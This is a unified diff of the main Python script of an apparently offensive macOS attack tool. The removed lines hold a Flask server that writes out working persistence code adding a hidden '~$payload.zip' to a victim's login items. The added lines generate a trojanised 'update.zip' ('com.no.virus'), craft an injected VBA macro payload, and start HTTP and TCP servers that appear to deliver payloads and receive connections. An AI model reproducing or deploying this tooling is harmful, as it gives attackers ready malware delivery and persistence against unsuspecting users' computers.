@@ -1,36 +1,47 @@
-from flask import Flask, send_file
-from flask_restful import Resource, Api
+from HttpServer import startHTTPServer
+from InfectedVBAMacro import VBAMacro
+from SocketServer import startSocketServer
+from threading import Thread
+from time import sleep
+from pathlib import Path
+import signal
+import InfectedUpdate
 
 
-app = Flask(__name__)
-api = Api(app)
-
-
+HOST = '192.168.1.29'
 HTTP_PORT = 8080
-HOST = '0.0.0.0'
+TCP_PORT = 5050
 
 
-class getUpdate(Resource):
-    def get(self):
-        return send_file('.\\Assets\\update.zip')
+def handler(*_):
+    print("Exiting")
+    exit(0)
 
 
-# /Users/robertbebert/Library
-class getCraftedPayload(Resource):
-    def get(self, path):
-        with open('.\\Assets\\persist.py', 'w') as persist:
-            persist.write(
-                f"""from CoreFoundation import kCFURLPOSIXPathStyle\nfrom CoreFoundation import CFURLCreateWithFileSystemPath\nfrom CoreFoundation import kCFAllocatorDefault\nfrom Foundation import NSBundle\nfrom objc import loadBundleFunctions\nfrom objc import loadBundleFunctions\nfrom Foundation import NSBundle\nfrom LaunchServices import kLSSharedFileListSessionLoginItems\n\n# File or app to be added in the login items list\nPATH = "/Users/{path}/Library/~$payload.zip"\n\nshared_file_list = NSBundle.bundleWithIdentifier_(\n    'com.apple.coreservices.SharedFileList')\nf = [\n    ('LSSharedFileListCreate',\n     b'^{{OpaqueLSSharedFileListRef=}}^{{__CFAllocator=}}^{{__CFString=}}@'),\n    ('LSSharedFileListCopySnapshot',\n     b'^{{__CFArray=}}^{{OpaqueLSSharedFileListRef=}}o^I'),\n    ('LSSharedFileListInsertItemURL',\n     b'^{{OpaqueLSSharedFileListItemRef=}}^{{OpaqueLSSharedFileListRef=}}^{{OpaqueLSSharedFileListItemRef=}}^{{__CFString=}}^{{OpaqueIconRef=}}^{{__CFURL=}}^{{__CFDictionary=}}^{{__CFArray=}}'),\n    ('kLSSharedFileListItemBeforeFirst', b'^{{OpaqueLSSharedFileListItemRef=}}')\n]\nloadBundleFunctions(shared_file_list, globals(), f)\nappURL = CFURLCreateWithFileSystemPath(None, PATH, kCFURLPOSIXPathStyle, False)\nitems = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListSessionLoginItems, None)\nLSSharedFileListInsertItemURL(items, kLSSharedFileListItemBeforeFirst, None, None, appURL, None, None)\n""")
-        return send_file('.\\Assets\\persist.py')
-
-
-api.add_resource(getUpdate, '/update')
-api.add_resource(getCraftedPayload, '/<path>')
-
-
-def startHTTPServer():
-    app.run(port=HTTP_PORT, host=HOST)
+def main():
+    assetsFolder = Path('./Assets')
+    if not assetsFolder.exists() or not assetsFolder.is_dir():
+        assetsFolder.mkdir()
+        print('[+] \'.\\Assets\' folder created.')
+    if not (assetsFolder / 'update.zip').exists():
+        print('[*] \'update.zip\' was not found. Crafting zip payload...')
+        InfectedUpdate.infectedUpdate('com.no.virus', HOST, TCP_PORT)
+        print('[+] \'update.zip\' successfully created.')
+    if not (assetsFolder / 'injection.vba').exists():
+        print('[*] \'injection.vba\' was not found. Crafting VBA payload...')
+        VBAMacro(assetsFolder / 'injection.vba', HOST, HTTP_PORT)
+        print('[+] VBA payload successfully created.')
+    signal.signal(signal.SIGINT, handler)
+    httpServer_proc = Thread(target=startHTTPServer, args=(HOST, HTTP_PORT))
+    httpServer_proc.daemon = True
+    socketServer_proc = Thread(target=startSocketServer, args=(HOST, TCP_PORT))
+    socketServer_proc.daemon = True
+    httpServer_proc.start()
+    sleep(5)
+    socketServer_proc.start()
+    while 1:
+        sleep(60)
 
 
 if __name__ == '__main__':
-    startHTTPServer()
+    main()
